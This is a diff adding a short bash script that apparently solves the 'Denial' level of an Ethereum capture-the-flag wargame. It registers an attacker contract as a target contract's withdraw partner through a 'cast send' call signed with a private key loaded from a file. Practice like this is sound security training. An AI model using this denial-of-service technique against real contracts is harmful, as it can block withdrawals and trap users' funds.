@@ -1,0 +1,12 @@
+#!/bin/bash
+
+set -e -o pipefail
+
+source key
+#
+CON=0x71c3a66D8e29496488eBcA64ad83138855Ce3EbB
+
+# forge create --private-key $KEY '20.denial.sol:Denial'
+HACK=0x96bed405e7e1efe1c6e730b88bb5afe3d1abe7ea
+
+cast send --private-key $KEY $CON 'setWithdrawPartner(address)' $HACK
